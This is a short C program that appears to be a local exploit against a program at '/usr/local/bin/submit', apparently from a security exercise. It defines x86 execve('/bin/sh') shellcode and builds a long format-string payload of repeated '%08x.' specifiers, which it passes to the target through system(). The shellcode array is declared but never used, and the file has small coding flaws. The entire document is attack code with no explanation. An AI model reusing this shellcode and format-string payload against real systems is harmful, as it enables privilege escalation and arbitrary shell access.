#include<stdio.h>
#include<string.h>

int main(){
	FILE *fp;
	int i;
	int count = 130;
	int p_cmd_len = 0;
  	char shellcode[] = "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh";
	char p_cmd[] = "P1234"
			"%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x."
			"%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x."
			"%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x."
			"%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x."
			"%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x."
			"%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x."
			"%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x."
			"%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x."
			"%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x."
			"%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x."
			"%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x."
			"%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x."
			"%08x.%08x.";
	char* cmd = (char*)malloc(1000);
	p_cmd_len = strlen(p_cmd);
	for(i =p_cmd_len-1;i<999;i++){
		cmd[i] = 'a';
	}
	snprintf(cmd, 1000, "/usr/local/bin/submit %s", p_cmd);
	system(cmd);	
	exit(0);
}
